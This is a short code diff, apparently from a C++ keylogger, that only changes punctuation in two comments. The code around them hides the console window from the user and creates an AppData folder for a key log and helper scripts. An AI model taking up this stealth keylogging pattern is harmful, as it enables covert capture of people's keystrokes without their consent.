@@ -14,7 +14,7 @@
 int main()
 {
    
-    //Hide console window from user.
+    //Hide console window from user
 
     Auxiliary::hideConsole();
 
@@ -22,7 +22,7 @@ int main()
     
     if (!Auxiliary::isConsoleVisible())
     {
-        //Create the directory where the key log, error log, as well as helper scripts will be stored.
+        //Create the directory where the key log, error log, as well as helper scripts will be stored
 
         IO::createDirectory(IO::getAppDataPath());
 
